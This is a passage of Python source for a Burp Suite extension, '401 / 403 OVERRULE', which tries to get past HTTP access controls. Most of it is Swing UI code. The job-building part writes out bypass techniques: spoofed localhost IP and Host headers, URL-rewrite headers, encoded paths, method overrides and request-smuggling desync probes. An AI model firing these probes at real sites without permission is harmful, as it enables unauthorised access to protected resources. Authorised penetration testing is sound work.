        style_button(self._btn_clear_all, BTN_RED)
        settings_row.add(self._btn_clear_all)

        # ---- GLOBAL PROGRESS BAR ----
        self._global_progress = JProgressBar(0, 100)
        self._global_progress.setPreferredSize(Dimension(120, 18))
        self._global_progress.setStringPainted(True)
        self._status_label = JLabel("Ready.")

        settings_row.add(Box.createHorizontalStrut(15))
        settings_row.add(self._global_progress)
        settings_row.add(Box.createHorizontalStrut(5))
        settings_row.add(self._status_label)

        left_top.add(settings_row)
        top.add(left_top, BorderLayout.CENTER)

        # Title added to the right (EAST) -- styled panel instead of a bare label
        title_panel = JPanel()
        title_panel.setLayout(BoxLayout(title_panel, BoxLayout.Y_AXIS))
        title_panel.setOpaque(True)
        title_panel.setBackground(TITLE_BG)
        title_panel.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createMatteBorder(0, 0, 3, 0, TITLE_ACCENT),
            BorderFactory.createEmptyBorder(10, 10, 10, 10)
        ))

        title_label = JLabel("401 / 403 OVERRULE")
        title_label.setFont(Font("SansSerif", Font.BOLD, 22))
        title_label.setForeground(TITLE_FG)
        title_label.setAlignmentX(0.5)

        subtitle_label = JLabel("Because Forbidden Deserves a Second Look.")
        subtitle_label.setFont(Font("SansSerif", Font.PLAIN, 11))
        subtitle_label.setForeground(TITLE_SUB_FG)
        subtitle_label.setAlignmentX(0.5)

        title_panel.add(title_label)
        title_panel.add(subtitle_label)
        top.add(title_panel, BorderLayout.EAST)

        self._panel.add(top, BorderLayout.NORTH)

        columns = ["Sel", "URL", "Variant", "Status", "Length"]

        class ReadOnlyModel(DefaultTableModel):
            def isCellEditable(self, row, col):
                return col == 0
            def getColumnClass(self, col):
                return JBoolean if col == 0 else JObject

        self._results_tabs = JTabbedPane()

        def make_tab(name):
            model = ReadOnlyModel(columns, 0)
            table = JTable(model)
            table.setAutoCreateRowSorter(True)
            table.setFillsViewportHeight(True)
            table.getColumnModel().getColumn(0).setMaxWidth(36)
            table.getColumnModel().getColumn(0).setMinWidth(36)

            center_renderer = DefaultTableCellRenderer()
            center_renderer.setHorizontalAlignment(SwingConstants.CENTER)
            left_renderer = DefaultTableCellRenderer()
            left_renderer.setHorizontalAlignment(SwingConstants.LEFT)
            url_col = 1
            for col_idx in range(1, len(columns)):
                if col_idx == url_col:
                    table.getColumnModel().getColumn(col_idx).setCellRenderer(left_renderer)
                    table.getColumnModel().getColumn(col_idx).setPreferredWidth(320)
                else:
                    table.getColumnModel().getColumn(col_idx).setCellRenderer(center_renderer)
            results_list = []
            jobs_list = []  

            def on_select(event, tbl=table, res_list=results_list):
                if event.getValueIsAdjusting(): return
                row = tbl.getSelectedRow()
                if row < 0: return
                model_row = tbl.convertRowIndexToModel(row)
                if model_row >= len(res_list): return
                result = res_list[model_row]
                self._editor_controller.current_result = result
                req_bytes = result.request_bytes if result.request_bytes is not None else bytearray()
                resp_bytes = result.response_bytes if result.response_bytes is not None else bytearray()
                self._req_viewer.setMessage(req_bytes, True)
                self._resp_viewer.setMessage(resp_bytes, False)

            table.getSelectionModel().addListSelectionListener(on_select)

            def show_popup(event, tbl=table, res_list=results_list):
                is_popup = event.isPopupTrigger() or event.getButton() == MouseEvent.BUTTON3
                if not is_popup: return
                row = tbl.rowAtPoint(event.getPoint())
                if row < 0: return
                if tbl.getSelectedRow() != row:
                    tbl.setRowSelectionInterval(row, row)
                model_row = tbl.convertRowIndexToModel(row)
                if model_row >= len(res_list): return
                result = res_list[model_row]
                self._show_result_context_menu(result, tbl, event.getX(), event.getY())

            class ResultTableMouseListener(MouseAdapter):
                def mousePressed(self, event): show_popup(event)
                def mouseReleased(self, event): show_popup(event)

            table.addMouseListener(ResultTableMouseListener())
            scroll = JScrollPane(table)

            ctrl = JPanel(FlowLayout(FlowLayout.LEFT))
            
            stop_btn = JButton("Stop", actionPerformed=lambda e, tn=name: self._on_tab_stop(tn))
            style_button(stop_btn, BTN_RED)
            stop_btn.setEnabled(False)

            resume_btn = JButton("Resume", actionPerformed=lambda e, tn=name: self._on_tab_resume(tn))
            style_button(resume_btn, BTN_YELLOW)
            resume_btn.setEnabled(False)

            sendsel_btn = JButton("Send Selected", actionPerformed=lambda e, tn=name: self._on_tab_send_selected(tn))
            style_button(sendsel_btn, BTN_GREEN)

            sendall_btn = JButton("Send All", actionPerformed=lambda e, tn=name: self._on_tab_send_all(tn))
            style_button(sendall_btn, BTN_GREEN)

            clearsel_btn = JButton("Clear Selected", actionPerformed=lambda e, tn=name: self._on_tab_clear_selected(tn))
            style_button(clearsel_btn, BTN_YELLOW)

            clearall_btn = JButton("Clear All", actionPerformed=lambda e, tn=name: self._on_tab_clear_all(tn))
            style_button(clearall_btn, BTN_RED)
            
            for comp in (stop_btn, resume_btn, sendsel_btn, sendall_btn, clearsel_btn, clearall_btn):
                ctrl.add(comp)

            tab_panel = JPanel(BorderLayout())
            tab_panel.add(ctrl, BorderLayout.NORTH)
            tab_panel.add(scroll, BorderLayout.CENTER)

            self._results_tabs.addTab(name, tab_panel)
            tab_index = self._results_tabs.getTabCount() - 1
            self._tab_data[name] = {
                "model": model, "table": table, "results": results_list, "jobs_by_row": jobs_list,
                "index": tab_index, "sent": 0, "pending_ops": [],
                "stop_btn": stop_btn, "resume_btn": resume_btn,
                "sendsel_btn": sendsel_btn, "sendall_btn": sendall_btn,
            }

        for tab_name, _keys in TECHNIQUE_TABS:
            make_tab(tab_name)

        self._editor_controller = _SelectedResultEditorController()
        self._req_viewer = self._callbacks.createMessageEditor(self._editor_controller, False)
        self._resp_viewer = self._callbacks.createMessageEditor(self._editor_controller, False)
        msg_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                                self._req_viewer.getComponent(),
                                self._resp_viewer.getComponent())
        msg_split.setResizeWeight(0.5)
        msg_split.setPreferredSize(Dimension(1000, 300))

        self._results_tabs.setPreferredSize(Dimension(1000, 300))
        main_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, self._results_tabs, msg_split)
        main_split.setResizeWeight(0.5)
        main_split.setDividerLocation(0.5)
        main_split.setOneTouchExpandable(True) 
        self._main_split = main_split
        self._panel.add(main_split, BorderLayout.CENTER)

        from java.awt.event import ComponentAdapter

        class _InitialLayoutFixer(ComponentAdapter):
            def componentResized(self, event, holder=[False]):
                if holder[0]: return
                if main_split.getHeight() > 0:
                    holder[0] = True
                    main_split.setDividerLocation(0.5)

        self._panel.addComponentListener(_InitialLayoutFixer())

    def getTabCaption(self):
        return "401/403 Overrule"

    def getUiComponent(self):
        return self._panel

    def _log(self, msg):
        self._callbacks.printOutput(msg)

    def _set_status(self, msg):
        if hasattr(self, '_status_label') and self._status_label:
            self._status_label.setText(msg)

    def _set_progress(self, pct, text):
        if hasattr(self, '_global_progress') and self._global_progress:
            self._global_progress.setValue(pct)
            self._global_progress.setString("%d%%" % pct)
        self._set_status(text)

    # ---- cumulative progress across ALL technique tabs ----
    def _invalidate_global_total(self):
        """Force the global job total to be recomputed on next use.
        Call this whenever something that affects job counts changes
        (new target loaded, all tabs cleared, etc.)."""
        self._global_total_ops = None

    def _compute_global_total(self):
        try:
            keys = self._keys_for_tab("GLOBAL")
            ops = self._build_jobs_for_keys(keys)
            return len(ops)
        except Exception:
            return 0

    def _ensure_global_total(self):
        if self._global_total_ops is None:
            self._global_total_ops = self._compute_global_total()
        return self._global_total_ops

    def _global_done_count(self):
        return sum(d.get("sent", 0) for name, d in self._tab_data.items() if name != "GLOBAL")

    def _refresh_global_progress(self, status_text=None):
        """Recompute and display cumulative progress across every technique
        tab (not just whatever tab/run is currently active)."""
        total = self._ensure_global_total()
        done = self._global_done_count()
        if total <= 0:
            pct = 100 if done > 0 else 0
        else:
            pct = int(100.0 * min(done, total) / total)
        text = status_text if status_text is not None else "Overall: %d / %d" % (done, total)
        if hasattr(self, '_global_progress') and self._global_progress:
            self._global_progress.setValue(pct)
            self._global_progress.setString("%d%% (%d/%d)" % (pct, done, total))
        self._set_status(text)

    def createMenuItems(self, invocation):
        menu = ArrayList()
        item = JMenuItem("Send to 403 Bypass", actionPerformed=lambda e, inv=invocation: self._send_to_tab(inv))
        menu.add(item)
        return menu

    def _send_to_tab(self, invocation):
        messages = invocation.getSelectedMessages()
        if not messages: return
        msg = messages[0]
        self._base_request = msg.getRequest()
        self._base_service = msg.getHttpService()
        self._base_info = self._helpers.analyzeRequest(self._base_service, self._base_request)
        url = self._base_info.getUrl()
        self._target_field.setText("%s %s" % (self._base_info.getMethod(), str(url)))
        self._baseline_cache = None
        for data in self._tab_data.values():
            data["pending_ops"] = []
            data["sent"] = 0
            data["total_ops"] = None
            if data.get("resume_btn"):
                data["resume_btn"].setEnabled(False)
        self._invalidate_global_total()
        self._refresh_global_progress("Loaded target: %s" % str(url))
        SwingUtilities.invokeLater(lambda: self._panel.getParent() and None)

    def _show_result_context_menu(self, result, table_component, x, y):
        service = result.http_service
        request_bytes = result.request_bytes
        response_bytes = result.response_bytes

        popup = JPopupMenu()

        def send_repeater(event, res=result, svc=service, req=request_bytes):
            if svc is None or req is None: return
            caption = (res.technique or "result")[:24]
            self._callbacks.sendToRepeater(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", req, caption)

        def send_intruder(event, svc=service, req=request_bytes):
            if svc is None or req is None: return
            self._callbacks.sendToIntruder(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", req)

        def send_comparer_request(event, req=request_bytes):
            if req is None: return
            self._callbacks.sendToComparer(req)

        def send_comparer_response(event, resp=response_bytes):
            if resp is None: return
            self._callbacks.sendToComparer(resp)

        def do_active_scan(event, svc=service, req=request_bytes):
            if svc is None or req is None: return
            self._callbacks.doActiveScan(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", req)

        def do_passive_scan(event, svc=service, req=request_bytes, resp=response_bytes):
            if svc is None or req is None or resp is None: return
            self._callbacks.doPassiveScan(svc.getHost(), svc.getPort(), svc.getProtocol() == "https", req, resp)

        item_repeater = JMenuItem("Send to Repeater", actionPerformed=send_repeater)
        item_repeater.setEnabled(service is not None and request_bytes is not None)
        popup.add(item_repeater)

        item_intruder = JMenuItem("Send to Intruder", actionPerformed=send_intruder)
        item_intruder.setEnabled(service is not None and request_bytes is not None)
        popup.add(item_intruder)

        popup.addSeparator()

        item_comparer_req = JMenuItem("Send to Comparer (request)", actionPerformed=send_comparer_request)
        item_comparer_req.setEnabled(request_bytes is not None)
        popup.add(item_comparer_req)

        item_comparer_resp = JMenuItem("Send to Comparer (response)", actionPerformed=send_comparer_response)
        item_comparer_resp.setEnabled(response_bytes is not None)
        popup.add(item_comparer_resp)

        popup.addSeparator()

        item_active = JMenuItem("Do active scan", actionPerformed=do_active_scan)
        item_active.setEnabled(service is not None and request_bytes is not None)
        popup.add(item_active)

        item_passive = JMenuItem("Do passive scan", actionPerformed=do_passive_scan)
        item_passive.setEnabled(service is not None and request_bytes is not None and response_bytes is not None)
        popup.add(item_passive)

        popup.show(table_component, x, y)

    def _keys_for_tab(self, tab_name):
        if tab_name == "GLOBAL":
            return set(TECHNIQUE_KEY_TO_TAB.keys())
        return set(TAB_NAME_TO_KEYS.get(tab_name, ()))

    def _no_target_dialog(self):
        JOptionPane.showMessageDialog(self._panel, "No target loaded. Right-click a request in Burp and choose 'Send to 403 Bypass' first.")

    def _busy_dialog(self):
        JOptionPane.showMessageDialog(self._panel, "A run is already in progress on '%s'. Stop it first." % self._active_tab)

    def _on_run_all_tabs(self):
        if self._base_request is None:
            self._no_target_dialog()
            return
        if self._active_tab is not None:
            self._busy_dialog()
            return
        self._clear_all_tabs()
        self._baseline_cache = None
        keys = self._keys_for_tab("GLOBAL")
        ops = self._build_jobs_for_keys(keys)
        Thread(target=lambda: self._run_ops("GLOBAL", ops)).start()

    def _on_stop_all(self):
        self._stop_flag[0] = True
        self._set_status("Stopping all...")

    def _on_resume_all(self):
        if self._base_request is None:
            self._no_target_dialog()
            return
        if self._active_tab is not None:
            self._busy_dialog()
            return
        
        pending = []
        for name, data in self._tab_data.items():
            if name != "GLOBAL" and data.get("pending_ops"):
                pending.extend(data["pending_ops"])
                data["pending_ops"] = []
                
        if "GLOBAL" in self._tab_data:
            self._tab_data["GLOBAL"]["pending_ops"] = []
            
        if not pending:
            self._set_status("Nothing to resume.")
            return
        self._refresh_global_buttons()
        Thread(target=lambda: self._run_ops("GLOBAL", pending)).start()

    def _on_clear_all_tabs(self):
        self._clear_all_tabs()
        self._baseline_cache = None
        self._invalidate_global_total()
        self._refresh_global_progress("Cleared all tabs.")

    def _on_tab_stop(self, tab_name):
        self._stop_flag[0] = True
        self._set_status("Stopping...")

    def _on_tab_resume(self, tab_name):
        if self._base_request is None:
            self._no_target_dialog()
            return
        if self._active_tab is not None:
            self._busy_dialog()
            return
        pending = self._tab_data[tab_name].get("pending_ops") or []
        if not pending:
            self._set_status("Nothing to resume for %s." % tab_name)
            return
        self._refresh_global_buttons()
        Thread(target=lambda: self._run_ops(tab_name, pending)).start()

    def _on_tab_send_all(self, tab_name):
        if self._base_request is None:
            self._no_target_dialog()
            return
        if self._active_tab is not None:
            self._busy_dialog()
            return
        keys = self._keys_for_tab(tab_name)
        ops = self._build_jobs_for_keys(keys)
        if not ops and tab_name != "Baseline":
            self._set_status("No requests to send for %s." % tab_name)
            return
        # "Send All" is a fresh run of this technique end-to-end, so clear
        # whatever was left in the table from a previous run first -- this
        # is different from Resume/Send Selected, which intentionally keep
        # existing rows and only append.
        self._clear_tab_own(tab_name)
        if tab_name == "Baseline":
            self._baseline_cache = None
        if tab_name in self._tab_data:
            self._tab_data[tab_name]["total_ops"] = len(ops)
        Thread(target=lambda: self._run_ops(tab_name, ops)).start()

    def _on_tab_send_selected(self, tab_name):
        if self._base_request is None:
            self._no_target_dialog()
            return
        if self._active_tab is not None:
            self._busy_dialog()
            return
        data = self._tab_data[tab_name]
        model = data["model"]
        idxs = [i for i in range(model.getRowCount()) if bool(model.getValueAt(i, 0))]
        if not idxs:
            self._set_status("No rows checked in %s." % tab_name)
            return
        ops = [data["jobs_by_row"][i] for i in idxs if data["jobs_by_row"][i] is not None]
        if not ops:
            self._set_status("Selected row(s) have nothing resendable.")
            return
        Thread(target=lambda: self._run_ops(tab_name, ops)).start()

    def _on_tab_clear_all(self, tab_name):
        self._clear_tab_own(tab_name)
        if tab_name == "Baseline":
            self._baseline_cache = None
        self._invalidate_global_total()
        self._refresh_global_progress("Cleared %s." % tab_name)

    def _on_tab_clear_selected(self, tab_name):
        data = self._tab_data[tab_name]
        model = data["model"]
        idxs = [i for i in range(model.getRowCount()) if bool(model.getValueAt(i, 0))]
        if not idxs:
            self._set_status("No rows checked in %s." % tab_name)
            return
        removed = [data["results"][i] for i in idxs]
        self._remove_results_from_tab(tab_name, removed)
        self._set_status("Removed %d selected row(s) from %s." % (len(idxs), tab_name))

    def _clear_tab_own(self, tab_name):
        data = self._tab_data.get(tab_name)
        if not data: return
        if "model" in data:
            data["model"].setRowCount(0)
        if "results" in data:
            del data["results"][:]
        if "jobs_by_row" in data:
            del data["jobs_by_row"][:]
        data["sent"] = 0
        data["pending_ops"] = []
        data["total_ops"] = None
        self._refresh_tab_title(tab_name)
        if data.get("resume_btn"):
            data["resume_btn"].setEnabled(False)
        self._refresh_global_buttons()

    def _clear_all_tabs(self):
        for name in list(self._tab_data.keys()):
            if name == "GLOBAL":
                self._tab_data[name]["pending_ops"] = []
                continue
            self._clear_tab_own(name)
        self._refresh_global_buttons()

    def _remove_results_from_tab(self, tab_name, results_to_remove):
        data = self._tab_data.get(tab_name)
        if not data or not results_to_remove: return
        remove_ids = set(id(r) for r in results_to_remove)
        keep_idx = [i for i, res in enumerate(data["results"]) if id(res) not in remove_ids]
        new_results = [data["results"][i] for i in keep_idx]
        new_jobs = [data["jobs_by_row"][i] for i in keep_idx]
        data["model"].setRowCount(0)
        for res in new_results:
            data["model"].addRow(self._row_for_result(res))
        data["results"] = new_results
        data["jobs_by_row"] = new_jobs
        self._refresh_tab_title(tab_name)

    def _has_any_pending(self):
        return any(bool(data.get("pending_ops")) for name, data in self._tab_data.items() if name != "GLOBAL")

    def _refresh_global_buttons(self):
        """
        Keep the top-level Run All / Stop All / Resume All / Clear All buttons
        in sync with actual state, instead of leaving them permanently
        clickable. Resume All in particular must only be enabled once there
        is something genuinely queued to resend -- never just because a run
        started or a button was clicked.
        """
        if not hasattr(self, "_btn_run_all_tabs"): return
        busy = self._active_tab is not None
        self._btn_run_all_tabs.setEnabled(not busy)
        self._btn_stop_all.setEnabled(busy)
        self._btn_resume_all.setEnabled((not busy) and self._has_any_pending())
        self._btn_clear_all.setEnabled(not busy)

    def _set_tabs_busy(self, busy, active_tab):
        for name, data in self._tab_data.items():
            if data.get("sendall_btn") is None: continue
            if busy:
                data["sendall_btn"].setEnabled(False)
                data["sendsel_btn"].setEnabled(False)
                data["resume_btn"].setEnabled(False)
                data["stop_btn"].setEnabled(name == active_tab or active_tab == "GLOBAL")
            else:
                data["sendall_btn"].setEnabled(True)
                data["sendsel_btn"].setEnabled(True)
                data["stop_btn"].setEnabled(False)
                data["resume_btn"].setEnabled(bool(data.get("pending_ops")))
        self._refresh_global_buttons()

    def _build_request(self, method=None, path=None, header_overrides=None,
                        extra_headers=None, host_override=None):
        info = self._base_info
        headers = list(info.getHeaders())
        first_line = headers[0].split(" ")
        if len(first_line) >= 3:
            orig_method, orig_path, http_ver = first_line[0], first_line[1], " ".join(first_line[2:])
        else:
            orig_method, orig_path, http_ver = info.getMethod(), str(info.getUrl().getPath()), "HTTP/1.1"

        new_method = method if method else orig_method
        new_path = path if path is not None else orig_path
        headers[0] = "%s %s %s" % (new_method, new_path, http_ver)

        def strip_header(hlist, name):
            lname = name.lower()
            return [h for h in hlist if not h.lower().startswith(lname + ":")]

        if header_overrides:
            for name, val in header_overrides:
                headers = strip_header(headers, name)
                headers.append("%s: %s" % (name, val))

        if host_override:
            headers = strip_header(headers, "Host")
            headers.append("Host: %s" % host_override)

        if extra_headers:
            for name, val in extra_headers:
                headers.append("%s: %s" % (name, val))

        body_offset = info.getBodyOffset()
        body = self._base_request[body_offset:]
        return self._helpers.buildHttpMessage(headers, body)

    def _send(self, request_bytes):
        resp = self._callbacks.makeHttpRequest(self._base_service, request_bytes)
        response_bytes = resp.getResponse()
        if response_bytes is None: return None, None, None
        resp_info = self._helpers.analyzeResponse(response_bytes)
        status = resp_info.getStatusCode()
        body_len = len(response_bytes) - resp_info.getBodyOffset()
        return status, body_len, response_bytes

    def _meta_from_response(self, response_bytes):
        if response_bytes is None: return None, None, None, ""
        resp_info = self._helpers.analyzeResponse(response_bytes)
        location = None
        content_type = None
        server = None
        for h in resp_info.getHeaders():
            low = h.lower()
            if low.startswith("location:"): location = h.split(":", 1)[1].strip()
            elif low.startswith("content-type:"): content_type = h.split(":", 1)[1].strip()
            elif low.startswith("server:"): server = h.split(":", 1)[1].strip()
        body_offset = resp_info.getBodyOffset()
        body = response_bytes[body_offset:]
        try: body_hash = hashlib.md5(bytes(bytearray(body))).hexdigest() if body else ""
        except Exception: body_hash = ""
        return location, content_type, server, body_hash

    def _calibrate(self, info, orig_method):
        base_url = str(info.getUrl())
        path = info.getUrl().getPath() or "/"
        base_dir = path if path.endswith("/") else path + "/"
        samples = []
        last_status = None
        last_meta = (None, None, None, "")
        for probe_path in CALIBRATION_PATHS:
            probe_url = base_dir.rstrip("/") + "/" + probe_path
            try:
                req = self._build_request(method="GET", path=probe_url)
                status, length, resp_bytes = self._send(req)
            except Exception: continue
            if status is None: continue
            last_status = status
            last_meta = self._meta_from_response(resp_bytes)
            samples.append(length or 0)

        tolerance = CALIBRATION_TOLERANCE_DEFAULT
        avg_len = 0
        if samples:
            avg_len = sum(samples) / len(samples)
            max_dev = max(abs(s - avg_len) for s in samples)
            if max_dev * 2 > tolerance: tolerance = int(max_dev * 2)

        fragment_len = None
        try:
            segments = path.rstrip("/").split("/")
            parent = "/".join(segments[:-1]) + "/" if len(segments) > 1 else "/"
            frag_req = self._build_request(method="GET", path=parent)
            _, frag_len, _ = self._send(frag_req)
            fragment_len = frag_len
        except Exception: pass

        location, content_type, server, body_hash = last_meta
        return {
            "status": last_status, "length": int(avg_len) if samples else None,
            "location": location, "content_type": content_type, "server": server,
            "body_hash": body_hash, "tolerance": tolerance, "fragment_length": fragment_len,
        }

    def _build_jobs_for_keys(self, wanted_keys):
        info = self._base_info
        path_only = info.getUrl().getPath()
        query_suffix = ""
        if info.getUrl().getQuery():
            query_suffix = "?" + info.getUrl().getQuery()
        orig_path = path_only + query_suffix
        orig_method = info.getMethod()

        ops = []

        def add_normal(technique, detail, method, path, header_overrides=None, extra_headers=None, host_override=None):
            ops.append({"kind": "normal", "technique": technique, "detail": detail,
                        "method": method, "path": path, "header_overrides": header_overrides,
                        "extra_headers": extra_headers, "host_override": host_override})

        if "verb-tampering" in wanted_keys:
            for m in HTTP_METHODS: add_normal("verb-tampering", m, m, orig_path)

        if "verb-tampering-case" in wanted_keys:
            for m in HTTP_METHODS:
                for variant in case_variants(m, n=2):
                    add_normal("verb-tampering-case", variant, variant, orig_path)

        if "headers-ip" in wanted_keys or "headers-url" in wanted_keys or "headers-generic" in wanted_keys:
            for hname in HEADER_NAMES:
                cls = classify_header(hname)
                if cls == "ip" and "headers-ip" in wanted_keys:
                    for ip in IPS: add_normal("headers-ip", "%s: %s" % (hname, ip), orig_method, orig_path, [(hname, ip)])
                elif cls == "url" and "headers-url" in wanted_keys:
                    add_normal("headers-url", "%s: %s" % (hname, orig_path), orig_method, orig_path, [(hname, orig_path)])
                    add_normal("headers-url", "%s: %s" % (hname, "http://127.0.0.1" + orig_path), orig_method, orig_path, [(hname, "http://127.0.0.1" + orig_path)])
                elif cls not in ("ip", "url") and "headers-generic" in wanted_keys:
                    add_normal("headers-generic", "%s: 127.0.0.1" % hname, orig_method, orig_path, [(hname, "127.0.0.1")])

        if "simpleheaders" in wanted_keys:
            for hname, hval in SIMPLE_HEADERS:
                add_normal("simpleheaders", "%s: %s" % (hname, hval), orig_method, orig_path, [(hname, hval)])

        if "endpaths" in wanted_keys:
            for payload in ENDPATHS:
                add_normal("endpaths", payload, orig_method, append_endpath(orig_path, payload))

        if "midpaths" in wanted_keys:
            for payload in MIDPATHS:
                add_normal("midpaths", payload, orig_method, insert_midpath(orig_path, payload))

        if "double-encoding" in wanted_keys:
            for detail, new_path in build_double_encoding_payloads(path_only):
                add_normal("double-encoding", detail, orig_method, new_path + query_suffix)

        if "unicode-encoding" in wanted_keys:
            for detail, new_path in build_unicode_encoding_payloads(path_only):
                add_normal("unicode-encoding", detail, orig_method, new_path + query_suffix)

        if "method-override-header" in wanted_keys or "method-override-query" in wanted_keys:
            for m in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
                if "method-override-header" in wanted_keys:
                    add_normal("method-override-header", "X-HTTP-Method-Override: %s" % m, orig_method, orig_path, [("X-HTTP-Method-Override", m)])
                    add_normal("method-override-header", "X-Method-Override: %s" % m, orig_method, orig_path, [("X-Method-Override", m)])
                if "method-override-query" in wanted_keys:
                    sep = "&" if "?" in orig_path else "?"
                    add_normal("method-override-query", "_method=%s" % m, orig_method, orig_path + sep + "_method=" + m)

        if "host-override" in wanted_keys:
            for hv in ["localhost", "127.0.0.1", "internal", orig_method and "127.0.0.1"]:
                if hv: add_normal("host-override", "Host: %s" % hv, orig_method, orig_path, None, None, hv)
            add_normal("host-override", "X-Forwarded-Host: 127.0.0.1", orig_method, orig_path, [("X-Forwarded-Host", "127.0.0.1")])

        if "path-case-switching" in wanted_keys:
            for i in range(4):
                scrambled = "".join(c.upper() if random.random() < 0.5 else c for c in orig_path)
                if scrambled != orig_path:
                    add_normal("path-case-switching", scrambled, orig_method, scrambled)

        if "user-agent-sweep" in wanted_keys:
            for ua in random.sample(USER_AGENTS, min(15, len(USER_AGENTS))):
                add_normal("user-agent-sweep", ua[:40] + "...", orig_method, orig_path, [("User-Agent", ua)])

        if "hop-by-hop" in wanted_keys:
            for hname, hval in HOP_BY_HOP_TARGETS:
                add_normal("hop-by-hop", "%s: %s + Connection: close, %s" % (hname, hval, hname), orig_method, orig_path, [(hname, hval), ("Connection", "close, " + hname)])

        if "header-confusion" in wanted_keys:
            real_host = self._base_service.getHost() if self._base_service else ""
            for label, hdrs in [
                ("X-Original-URL -> path", [("X-Original-URL", path_only)]),
                ("X-Rewrite-URL -> path", [("X-Rewrite-URL", path_only)]),
                ("X-Forwarded-Uri -> path", [("X-Forwarded-Uri", path_only)]),
                ("X-Forwarded-URL -> request-uri", [("X-Forwarded-URL", orig_path)]),
                ("X-Forwarded-Prefix -> path", [("X-Forwarded-Prefix", path_only)]),
                ("rewrite root/path split", [("X-Original-URL", "/"), ("X-Rewrite-URL", path_only)]),
                ("front-end https", [("Front-End-Https", "on"), ("X-Forwarded-Proto", "https")]),
                ("original/forwarded host", [("X-Original-Host", "localhost"), ("X-Forwarded-Host", real_host)]),
            ]: add_normal("header-confusion", label, orig_method, orig_path, hdrs)

        if "forwarded-trust" in wanted_keys:
            for label, hdrs in FORWARDED_TRUST_TEMPLATES: add_normal("forwarded-trust", label, orig_method, orig_path, hdrs)

        if "proto-confusion" in wanted_keys:
            for label, hdrs in PROTO_CONFUSION_TEMPLATES: add_normal("proto-confusion", label, orig_method, orig_path, hdrs)

        if "ip-encoding" in wanted_keys:
            for hname in IP_ENCODING_HEADERS:
                for ip in IP_ENCODING_VALUES: add_normal("ip-encoding", "%s: %s" % (hname, ip), orig_method, orig_path, [(hname, ip)])

        if "path-normalization" in wanted_keys:
            for new_path in build_path_normalization_payloads(path_only, query_suffix): add_normal("path-normalization", new_path, orig_method, new_path)

        if "suffix-tricks" in wanted_keys:
            for new_path in build_suffix_tricks_payloads(path_only, query_suffix, info.getUrl().getQuery() or ""): add_normal("suffix-tricks", new_path, orig_method, new_path)

        use_https = self._base_service.getProtocol() == "https"
        host = self._base_service.getHost()
        port = self._base_service.getPort()
        scheme = "https" if use_https else "http"
        base_headers = [(n.strip(), v.strip()) for n, v in [h.split(":", 1) for h in list(info.getHeaders())[1:] if ":" in h] if n.strip().lower() != "content-length"]

        def add_raw(technique, label, method, target, headers, body, http_ver):
            ops.append({"kind": "raw", "technique": technique, "label": label, "method": method, "target": target, "headers": headers, "body": body, "http_ver": http_ver})

        if "absolute-uri" in wanted_keys:
            for target in build_absolute_uri_request_targets(scheme, host, orig_path):
                add_raw("absolute-uri", "request-target: " + target, orig_method, target, list(base_headers), "", "HTTP/1.1")

        if "http-versions" in wanted_keys:
            add_raw("http-versions", "HTTP/1.0", orig_method, orig_path, list(base_headers), "", "HTTP/1.0")
            add_raw("http-versions", "HTTP/1.1", orig_method, orig_path, list(base_headers), "", "HTTP/1.1")

        if "http-parser" in wanted_keys:
            add_raw("http-parser", "minimal request (Host only)", orig_method, orig_path, [("Host", host)], "", "HTTP/1.1")

        if "raw-duplicates" in wanted_keys:
            for label, hdr_pairs in RAW_DUPLICATE_TEMPLATES:
                resolved = []
                for name, val in hdr_pairs:
                    if val is None:
                        val = path_only if name in ("X-Original-URL", "X-Rewrite-URL") else "for=1.1.1.1;host=" + host if name == "Forwarded" else host
                    resolved.append((name, val))
                add_raw("raw-duplicates", label, orig_method, orig_path, list(base_headers) + resolved, "", "HTTP/1.1")

        if "raw-authority" in wanted_keys:
            for label, hdr_pairs in RAW_AUTHORITY_TEMPLATES:
                resolved = [(name, host if val is None else val) for name, val in hdr_pairs]
                filtered = [(n, v) for n, v in base_headers if n.lower() != "host"]
                add_raw("raw-authority", label, orig_method, orig_path, resolved + filtered, "", "HTTP/1.1")

        if "raw-desync" in wanted_keys:
            for probe in RAW_DESYNC_PROBES:
                add_raw("raw-desync", probe["label"], probe["method"], probe.get("request_target", orig_path), list(base_headers) + list(probe["headers"]), probe["body"], "HTTP/1.1")

        return ops

    def _send_op(self, op):
        kind = op["kind"]
        if kind == "baseline":
            req = self._base_request
            status, length, resp_bytes = self._send(req)
            location, content_type, server, body_hash = self._meta_from_response(resp_bytes)
            return {"technique": "default", "detail": "(baseline)", "method": self._base_info.getMethod(), "status": status, "length": length, "resp_bytes": resp_bytes, "req_bytes": req, "location": location, "content_type": content_type, "server": server, "body_hash": body_hash}

        if kind == "normal":
            req = None
            try:
                req = self._build_request(method=op["method"], path=op["path"], header_overrides=op["header_overrides"], extra_headers=op["extra_headers"], host_override=op["host_override"])
                status, length, resp_bytes = self._send(req)
                location, content_type, server, body_hash = self._meta_from_response(resp_bytes)
            except Exception as e:
                status, length, resp_bytes = None, None, None
                location, content_type, server, body_hash = None, None, None, ""
                self._log("Error on %s / %s: %s" % (op["technique"], op["detail"], str(e)))
            return {"technique": op["technique"], "detail": op["detail"], "method": op["method"], "status": status, "length": length, "resp_bytes": resp_bytes, "req_bytes": req, "location": location, "content_type": content_type, "server": server, "body_hash": body_hash}

        req_bytes = None
        resp_bytes = None
        try:
            req_bytes = build_raw_request_bytes(op["method"], op["target"], op["http_ver"], op["headers"], op["body"])
            status, length, resp_bytes = self._send(req_bytes)
            location, content_type, server, body_hash = self._meta_from_response(resp_bytes)
        except Exception as e:
            status, length = None, None
            location, content_type, server, body_hash = None, None, None, ""
            self._log("Error on %s / %s: %s" % (op["technique"], op["label"], str(e)))
        return {"technique": op["technique"], "detail": op["label"], "method": op["method"], "status": status, "length": length, "resp_bytes": resp_bytes, "req_bytes": req_bytes, "location": location, "content_type": content_type, "server": server, "body_hash": body_hash}

    def _score_and_flag(self, status, length, location, content_type, server, body_hash, baseline, tolerance):
        score = score_result(status, length, location, content_type, server, body_hash, baseline, tolerance)
        likelihood = classify_likelihood(score)
        reason = score_reason(status, length, location, content_type, server, body_hash, baseline, tolerance)
        interesting = score > 0
        if not self._cb_strict_calibrate.isSelected():
